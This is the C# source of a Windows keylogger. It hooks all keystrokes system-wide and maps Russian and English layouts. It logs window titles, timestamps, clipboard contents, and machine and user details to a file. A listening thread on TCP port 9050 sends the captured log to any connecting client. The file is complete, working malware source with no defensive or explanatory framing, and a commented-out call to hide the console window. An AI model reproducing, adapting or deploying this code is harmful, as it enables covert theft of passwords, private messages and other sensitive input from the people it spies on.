using System;
using System.Windows;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Threading;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Security.Permissions;



namespace ConsoleApp2
{
    class Program
    {

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYUP = 0x0105;
        private const int WM_SYSKEYDOWN = 0x0104;
        public const int KF_REPEAT = 0X40000000;

        private const int VK_SHIFT = 0x10;	// SHIFT
        private const int VK_CONTROL = 0x11;	// CONTROL
        private const int VK_MENU = 0x12; // ALT
        private const int VK_CAPITAL = 0x14; // CAPS LOCK

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        public static string mss;
        public static int myi = 0;



        static Dictionary<char, char> dictionaryRusEng = new Dictionary<char, char>();
        static Dictionary<char, char> dictionaryDigits = new Dictionary<char, char>();

        [STAThread]
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            // Hide
            //ShowWindow(handle, SW_HIDE);
            ShowWindow(handle, 1);
            dictionaryRusEng.Add('Q', 'Й');
            dictionaryRusEng.Add('W', 'Ц');
            dictionaryRusEng.Add('E', 'У');
            dictionaryRusEng.Add('R', 'К');
            dictionaryRusEng.Add('T', 'Е');
            dictionaryRusEng.Add('Y', 'Н');
            dictionaryRusEng.Add('U', 'Г');
            dictionaryRusEng.Add('I', 'Ш');
            dictionaryRusEng.Add('O', 'Щ');
            dictionaryRusEng.Add('P', 'З');
            dictionaryRusEng.Add('[', 'Х');
            dictionaryRusEng.Add(']', 'Ъ');
            dictionaryRusEng.Add('A', 'Ф');
            dictionaryRusEng.Add('S', 'Ы');
            dictionaryRusEng.Add('D', 'В');
            dictionaryRusEng.Add('F', 'А');
            dictionaryRusEng.Add('G', 'П');
            dictionaryRusEng.Add('H', 'Р');
            dictionaryRusEng.Add('J', 'О');
            dictionaryRusEng.Add('K', 'Л');
            dictionaryRusEng.Add('L', 'Д');
            dictionaryRusEng.Add(';', 'Ж');
            dictionaryRusEng.Add('\'', 'Э');
            dictionaryRusEng.Add('Z', 'Я');
            dictionaryRusEng.Add('X', 'Ч');
            dictionaryRusEng.Add('C', 'С');
            dictionaryRusEng.Add('V', 'М');
            dictionaryRusEng.Add('B', 'И');
            dictionaryRusEng.Add('N', 'Т');
            dictionaryRusEng.Add('M', 'Ь');
            dictionaryRusEng.Add(',', 'Б');
            dictionaryRusEng.Add('.', 'Ю');
            dictionaryRusEng.Add('`', 'Ё');


            dictionaryDigits.Add('1', '!');
            dictionaryDigits.Add('2', '@');
            dictionaryDigits.Add('3', '#');
            dictionaryDigits.Add('4', '$');
            dictionaryDigits.Add('5', '%');
            dictionaryDigits.Add('6', '^');
            dictionaryDigits.Add('7', '&');
            dictionaryDigits.Add('8', '*');
            dictionaryDigits.Add('9', '(');
            dictionaryDigits.Add('0', ')');
            dictionaryDigits.Add('`', '~');
            dictionaryDigits.Add('-', '_');
            dictionaryDigits.Add('=', '+');




            _hookID = SetHook(_proc);
            // получаем переменные окружения и данные о пользователе

            /* Writer(Encrypt("CurrentDirectory: {0}" + Environment.CurrentDirectory + "\n", "Key"));
             Writer(Encrypt("MachineName: {0}" + Environment.MachineName + "\n", "Key"));
             Writer(Encrypt("OSVersion: {0}" + Environment.OSVersion.ToString() + "\n", "Key"));
             Writer(Encrypt("SystemDirectory: {0}" + Environment.SystemDirectory + "\n", "Key"));
             Writer(Encrypt("UserDomainName: {0}" + Environment.UserDomainName + "\n", "Key"));
             Writer(Encrypt("UserInteractive: {0}" + Environment.UserInteractive + "\n", "Key"));
             Writer(Encrypt("UserName: {0}" + Environment.UserName + "\n", "Key"));

             */

            Writer("\n========================================================================================================================\n\nCurrentDirectory: {0}" + Environment.CurrentDirectory + "\n");
            Writer("MachineName: {0}" + Environment.MachineName + "\n");
            Writer("OSVersion: {0}" + Environment.OSVersion.ToString() + "\n");
            Writer("SystemDirectory: {0}" + Environment.SystemDirectory + "\n");
            Writer("UserDomainName: {0}" + Environment.UserDomainName + "\n");
            Writer("UserInteractive: {0}" + Environment.UserInteractive + "\n");
            Writer("UserName: {0}" + Environment.UserName + "\n\n========================================================================================================================\n\n");


            //  Writer(Decrypt(Encrypt("CurrentDirectory: {0}" + Environment.CurrentDirectory + "\n", "Key"), "Key"));

            //Writer(Decrypt(Encrypt("MachineName: {0}" + Environment.MachineName + "\n", "Key"), "Key"));
            //   Writer(Encrypt("OSVersion: {0}" + Environment.OSVersion.ToString() + "\n", "Key"));
            // Writer(Encrypt("SystemDirectory: {0}" + Environment.SystemDirectory + "\n", "Key"));
            // Writer(Encrypt("UserDomainName: {0}" + Environment.UserDomainName + "\n", "Key"));
            //  Writer(Encrypt("UserInteractive: {0}" + Environment.UserInteractive + "\n", "Key"));
            //Writer(Encrypt("UserName: {0}" + Environment.UserName + "\n", "Key"));

            // получаем буфер обмена при запуске
            string htmlData = GetBuff();
            //     Console.WriteLine("Clipboard: {0}\n", htmlData);

            // получаем текущую раскладку клавиатуры

            ushort lang = GetKeyboardLayout();
            //    Console.WriteLine("kl {0}",lang);
            mss = lang.ToString();
            //  Console.WriteLine("Первоначальная раскладка: {0}\n", lang.ToString());
            // Writer(Encrypt("Первоначальная раскладка: " + mss + "\n", "Key"));
            Writer("Original keyboard layout: " + mss + "\n");
            Thread mtr = new System.Threading.Thread(ServerSocket);
            mtr.Start();
            Application.Run();


            UnhookWindowsHookEx(_hookID);
        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }


        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);


      static string PreviousProgram="";

        private static IntPtr HookCallback(int nCode,IntPtr wParam, IntPtr lParam)
        {
         
            if (nCode >= 0)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string CurrentProgram = GetActiveWindowTitle();
                if (!CurrentProgram.Equals(PreviousProgram))
                {
                    PreviousProgram = CurrentProgram;
                    string time = DateTime.Now.ToString();
                    Writer("\n\t[Program: " + CurrentProgram + "\n\tDateTime: " + time + "]\n");
                 //   Console.WriteLine("[Program: " + CurrentProgram + "  DateTime: " + time + "]\n");
                }


                KeysConverter kc = new KeysConverter();

                string mystring = kc.ConvertToString((Keys)vkCode);

                string original = mystring;
                string encrypted;

               ///
                bool capsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
                bool sh = Control.ModifierKeys != Keys.Shift;
                
             //   if (original.Length==1 && !capsLock) { original = original.ToLower(); }
               // if (original.Length==1 && !sh){ original = original.ToLower(); }
                // запрашиваем раскладку клавиатуры для каждого символа


                ushort lang_check = GetKeyboardLayout();
                string mss_check = lang_check.ToString();

                if (mss == mss_check) { }
                else
                {
                    //    Console.WriteLine("Смена раскладки: {0}", mss_check);
                    encrypted = Encrypt("\n<Смена раскладки:" + mss_check + " >\n", "Key");
                    Writer("\n\t< Смена раскладки: " + mss_check + " >\n");
                    //      Writer(encrypted);
                    mss = mss_check;
                }

                if (wParam == (IntPtr)WM_KEYDOWN)   //пишем все клавиши подряд
                {
                    if (GetKeyboardLayout() == 1049 && original.Length==1)
                    {
                        original = Russian(original[0]);
                    }

                    if (original.Length==1 && capsLock && char.IsLetter(original[0])) {
                      
                         original = ChangeRegister(original[0]);
                    }
                    if (original.Length==1 && sh && char.IsLetter(original[0]))
                    { 
                        original = ChangeRegister(original[0]); 
                    }

                    if (original.Length == 1 && !sh && (char.IsDigit(original[0]) || original[0] == '`' || original[0] == '-' || original[0] == '='))
                    {
                        original = DigitToSym(original[0]);
                    }

                    //Writer(Encrypt(original, "Key"));
                   if(original.Length==1)
                    Writer(original);
                    
                }

                if (wParam == (IntPtr)WM_KEYUP) // пишем только те что были отпущены (в нашем случае все контрольные)
                {
                    if (Keys.LControlKey == (Keys)vkCode)
                    {
                     //   Writer("<"+original+">");
                        //Writer(Encrypt(original, "Key")); 
                    } // если был отпущен = запись
                    if (Keys.LShiftKey == (Keys)vkCode)
                    {
                      //  Writer("<"+original+">");
                        //Writer(Encrypt(original, "Key")); 
                    } // если был отпущен = запись

                    if(Keys.Space == (Keys)vkCode)
                    {
                        Writer(" ");
                    }
                    if (Keys.Enter == (Keys)vkCode)
                    {
                        Writer("\n");
                    }
                    if (Keys.Tab == (Keys)vkCode)
                    {
                        Writer("\t");
                    }

                    if (Keys.Back == (Keys)vkCode)
                    {
                        Writer("<backspace>");
                    }

                    if(Keys.OemOpenBrackets == (Keys)vkCode )
                    {
                        char sym;
                        if (lang_check == 1033 || lang_check ==0)
                        {
                            if (Keys.Shift == Control.ModifierKeys) { Writer("{"); }
                            else Writer("[");
                        }
                        else if (lang_check == 1049)
                        {
                            sym = 'Х';
                            if (capsLock)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            if (sh)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            Writer(sym.ToString());
                        }

                       
                    }

                    if (Keys.OemCloseBrackets == (Keys)vkCode)
                    {
                        char sym;
                        if (lang_check == 1033 || lang_check == 0)
                        {
                            if (Keys.Shift == Control.ModifierKeys) { Writer("}"); }
                            else Writer("]");
                        }
                        else if (lang_check == 1049)
                        {
                            sym = 'Ъ';
                            if (capsLock)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            if (sh)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            Writer(sym.ToString());
                        }


                    }

                  

                    if (Keys.Oem5 == (Keys)vkCode && Keys.Shift != Control.ModifierKeys)
                    {
                        Writer("\\");
                    }

                    if (Keys.Oem5 == (Keys)vkCode && Keys.Shift == Control.ModifierKeys)
                    {
                        Writer("|");
                    } 

              
                    if (Keys.Oem7 == (Keys)vkCode)
                    {
                        char sym;
                        if (lang_check == 1033 || lang_check == 0)
                        {
                            if (Keys.Shift == Control.ModifierKeys) { Writer("\""); }
                            else Writer("'");
                        }
                        else if (lang_check == 1049)
                        {
                            sym = 'Э';
                            if (capsLock)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            if (sh)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            Writer(sym.ToString());
                        }
                    }
                    if (Keys.Oem1 == (Keys)vkCode)
                    {
                        char sym;
                        if (lang_check == 1033 || lang_check == 0)
                        {
                            if (Keys.Shift == Control.ModifierKeys) { Writer(":"); }
                            else Writer(";");
                        }
                        else if (lang_check == 1049)
                        {
                            sym = 'Ж';
                            if (capsLock)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            if (sh)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            Writer(sym.ToString());
                        }
                    }

                    if (Keys.OemQuestion == (Keys)vkCode)
                    {
                      
                        if (lang_check == 1033 || lang_check == 0)
                        {
                            if (Keys.Shift == Control.ModifierKeys) { Writer("?"); }
                            else Writer("/");
                        }
                        else if (lang_check == 1049)
                        {
                            if (Keys.Shift == Control.ModifierKeys) { Writer(","); }
                            else Writer(".");
                        }
                    }

                    if (Keys.OemPeriod == (Keys)vkCode)
                    {
                        char sym;
                        if (lang_check == 1033 || lang_check == 0)
                        {
                            if (Keys.Shift == Control.ModifierKeys) { Writer(">"); }
                            else Writer(".");
                        }
                        else if (lang_check == 1049)
                        {
                            sym = 'Ю';
                            if (capsLock)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            if (sh)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            Writer(sym.ToString());
                        }
                    }

                    if (Keys.Oemcomma == (Keys)vkCode)
                    {
                        char sym;
                        if (lang_check == 1033 || lang_check == 0)
                        {
                            if (Keys.Shift == Control.ModifierKeys) { Writer("<"); }
                            else Writer(",");
                        }
                        else if (lang_check == 1049)
                        {
                            sym = 'Б';
                            if (capsLock)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            if (sh)
                            {
                                sym = ChangeRegister(sym)[0];
                            }
                            Writer(sym.ToString());
                        }
                    }

                }

                // ловим сочетание клавиш CTRL+C (копирование в буфер)
                if (Keys.C == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                    //     Console.WriteLine("CTRL+C: {0}", (Keys)vkCode);

                    string htmlData1 = GetBuff();                                                   // получаем буфер
                    Writer("\n\t<COPY>\n");
                    Writer("Содержимое буфера: " + htmlData1 + "\n");                  // записываем буфер
                                                                                       //  Writer(Encrypt("Содержимое буфера: " + htmlData1 + "\n", "Key"));                  // записываем буфер
                                                                                       //  Console.WriteLine("Clipboard: {0}", htmlData1);

                    encrypted = Encrypt("\n<COPY>\n", "Key");

                    //  Writer(encrypted);
                }

                else if (Keys.V == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                    //return (IntPtr)1; // вроде как блокировка нажатия работает, проверил
                    //    Console.WriteLine("CTRL+V: {0}", (Keys)vkCode);
                    encrypted = Encrypt("\n\t<PASTE>\n", "Key");
                    // Writer(encrypted);
                    Writer("\n\t<PASTE> \n");
                    Writer("Содержимое буфера: " + GetBuff().ToString() + "\n");
                }
                else if (Keys.Z == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                    //   Console.WriteLine("CTRL+Z: {0}", (Keys)vkCode);
                    encrypted = Encrypt("\n\t<CANCEL>\n", "Key");
                    //  Writer(encrypted);
                    Writer("\n\t<CANCEL>\n");
                }
                else if (Keys.F == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                    //Console.WriteLine("CTRL+F: {0}", (Keys)vkCode);
                    encrypted = Encrypt("\n\t<SEARCH>\n", "Key");
                    //Writer(encrypted);
                    Writer("\n\t<SEARCH>\n");
                }
                else if (Keys.A == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                    //Console.WriteLine("CTRL+A: {0}", (Keys)vkCode);
                    encrypted = Encrypt("\n\t<SELECT ALL>\n", "Key");
                    //
                    //Writer(encrypted);
                    Writer("\n\t<SELECT ALL>\n");
                }
                else if (Keys.N == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

          
                    encrypted = Encrypt("\t<NEW>\n", "Key");
                    //Writer(encrypted);
                    Writer("\n\t<NEW>\n");
                }
                else if (Keys.T == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    
                    encrypted = Encrypt("\t<CTRL+T>\n", "Key");
                    Writer("\n\t<CTRL T>\n");
                    // Writer(encrypted);

                }
                else if (Keys.X == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {

                    
                    encrypted = Encrypt("\n\t<CUT>\n", "Key");
                    //Writer(encrypted);
                    Writer("\n\t<CUT>\n");
                }

            //    Console.WriteLine("Original:   {0}", original);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }


        public static string GetBuff()
        {
            string htmlData = Clipboard.GetText(TextDataFormat.UnicodeText);
            return htmlData;
        }


        // Записываем шифрованный текст в файл

        public static void Writer(string inputstring)
        {

            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.dat", true);
            Console.WriteLine(inputstring);
            sw.Write(inputstring);
            sw.Flush();
            sw.Close();

        }

        public static string Encrypt(string plainText, string password, string salt = "Key", string hashAlgorithm = "SHA1", int passwordIterations = 2, string initialVector = "OFRna73m*aze01xY", int keySize = 256)
        {
            if (string.IsNullOrEmpty(plainText))
                return "";

            byte[] initialVectorBytes = Encoding.ASCII.GetBytes(initialVector);
            byte[] saltValueBytes = Encoding.ASCII.GetBytes(salt);
            byte[] plainTextBytes = Encoding.UTF8.GetBytes(plainText);

            PasswordDeriveBytes derivedPassword = new PasswordDeriveBytes
             (password, saltValueBytes, hashAlgorithm, passwordIterations);

            byte[] keyBytes = derivedPassword.GetBytes(keySize / 8);
            RijndaelManaged symmetricKey = new RijndaelManaged();
            symmetricKey.Mode = CipherMode.CBC;

            byte[] cipherTextBytes = null;

            using (ICryptoTransform encryptor = symmetricKey.CreateEncryptor
            (keyBytes, initialVectorBytes))
            {
                using (MemoryStream memStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream
                             (memStream, encryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length);
                        cryptoStream.FlushFinalBlock();
                        cipherTextBytes = memStream.ToArray();
                        memStream.Close();
                        cryptoStream.Close();
                    }
                }
            }

            symmetricKey.Clear();
            return Convert.ToBase64String(cipherTextBytes);
        }




        public static string Decrypt(string encryptedText, string password, string salt = "Key", string hashAlgorithm = "SHA1", int passwordIterations = 2, string initialVector = "OFRna73m*aze01xY", int keySize = 256)
        {
            if (string.IsNullOrEmpty(encryptedText))
                return "";
            byte[] initialVectorBytes = Encoding.ASCII.GetBytes(initialVector);
            byte[] saltValueBytes = Encoding.ASCII.GetBytes(salt);
            byte[] encryptedTextBytes = Encoding.UTF8.GetBytes(encryptedText);

            PasswordDeriveBytes derivedPassword = new PasswordDeriveBytes
            (password, saltValueBytes, hashAlgorithm, passwordIterations);

            byte[] keyBytes = derivedPassword.GetBytes(keySize / 8);
            RijndaelManaged symmetricKey = new RijndaelManaged();
            symmetricKey.Mode = CipherMode.CBC;

            byte[] decryptedTextBytes = null;

            using (ICryptoTransform decryptor = symmetricKey.CreateDecryptor
           (keyBytes, initialVectorBytes))
            {
                using (MemoryStream memStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream
                            (memStream, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(encryptedTextBytes, 0, encryptedTextBytes.Length);
                        ////////////////////////////////
                        ///
                        cryptoStream.FlushFinalBlock();
                        ///
                        /////////////////////////////////
                        decryptedTextBytes = memStream.ToArray();
                        memStream.Close();
                        cryptoStream.Close();
                    }
                }
            }
            symmetricKey.Clear();
            return Convert.ToBase64String(decryptedTextBytes);
        }


        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }




        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        internal static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        const int SW_HIDE = 0;

        //------------------------------Пробуем узнать раскладку клавиатуры-------------------------------------------------//

        [DllImport("user32.dll", SetLastError = true)]
        static extern int GetWindowThreadProcessId(
            [In] IntPtr hWnd,
            [Out, Optional] IntPtr lpdwProcessId
            );

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern ushort GetKeyboardLayout(
            [In] int idThread
            );

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        static ushort GetKeyboardLayout()
        {
            return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
        }





        public static string Russian(char sym)
        {
            if (char.IsLetter(sym))
            {
                return dictionaryRusEng[sym].ToString();
            }
            return sym.ToString();
        }


        public static string ChangeRegister(char  sym)
        {
            if (char.IsLower(sym))
            {
                return char.ToUpper(sym).ToString();
            }
            else if (char.IsUpper(sym))
            {
                return char.ToLower(sym).ToString();
            }
            return sym.ToString();
        }


        public static string DigitToSym(char sym)
        {
            return dictionaryDigits[sym].ToString();
        }



        public static void ServerSocket()
        {
            while (true)
            {
                {
                    try
                    {
                        IPEndPoint ipep = new IPEndPoint(IPAddress.Any, 9050);
                        Socket newsock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        newsock.Bind(ipep);
                        newsock.Listen(10);
                        Console.WriteLine("Waiting for a client...");
                        Socket client = newsock.Accept();
                        IPEndPoint clientep = (IPEndPoint)client.RemoteEndPoint;
                        Console.WriteLine("Connected with {0} at port {1}", clientep.Address, clientep.Port);
                        // FileInfo fi = new FileInfo(Application.StartupPath + @"\log.dat");
                        // string fsize= fi.Length.ToString();
                        try
                        {

                            client.SendFile(Application.StartupPath + @"\log.dat");
                            Console.WriteLine("Disconnected from {0}", clientep.Address);
                            client.Close();
                            newsock.Close();

                        }
                        catch (Exception ex)
                        {
                            Console.Write(ex.Message);
                        }
                    }

                    catch (Exception e)
                    {
                        Console.Write(e.Message);
                    }


                }
            }

        }
    }
}
